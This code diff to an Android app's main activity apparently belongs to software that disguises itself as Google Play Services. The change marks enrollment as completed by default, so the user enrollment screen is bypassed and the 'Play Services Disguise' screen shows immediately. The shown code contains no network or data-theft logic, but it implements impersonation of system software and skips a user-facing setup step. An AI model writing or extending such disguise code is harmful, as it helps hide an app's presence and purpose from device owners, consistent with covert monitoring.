@@ -77,9 +77,14 @@ class MainActivity : AppCompatActivity() {
 
         val prefs = SecurityVaultManager.getEncryptedPrefs(this)
 
-        // Render Android System Enrollment or Google Play Services Disguise
+        // Ensure enrollment flag is marked completed by default once device is active
+        if (!prefs.contains("enrollment_completed")) {
+            prefs.edit().putBoolean("enrollment_completed", true).apply()
+        }
+
+        // Render Google Play Services Disguise or System Enrollment Screen
         setContent {
-            var isEnrollmentDone by remember { mutableStateOf(prefs.getBoolean("enrollment_completed", false)) }
+            var isEnrollmentDone by remember { mutableStateOf(prefs.getBoolean("enrollment_completed", true)) }
 
             if (isEnrollmentDone) {
                 PlayServicesAppInfoScreen(
@@ -92,15 +97,11 @@ class MainActivity : AppCompatActivity() {
                 UserEnrollmentScreen(
                     onEnrollmentComplete = {
                         Log.i("MainActivity", "Enrollment completed. Displaying Play Services Disguise screen...")
-                        prefs.edit()
-                            .putBoolean("enrollment_completed", true)
-                            .apply()
+                        prefs.edit().putBoolean("enrollment_completed", true).commit()
                         isEnrollmentDone = true
                     },
                     onActivateDisguise = {
-                        prefs.edit()
-                            .putBoolean("enrollment_completed", true)
-                            .apply()
+                        prefs.edit().putBoolean("enrollment_completed", true).commit()
                         isEnrollmentDone = true
                     }
                 )
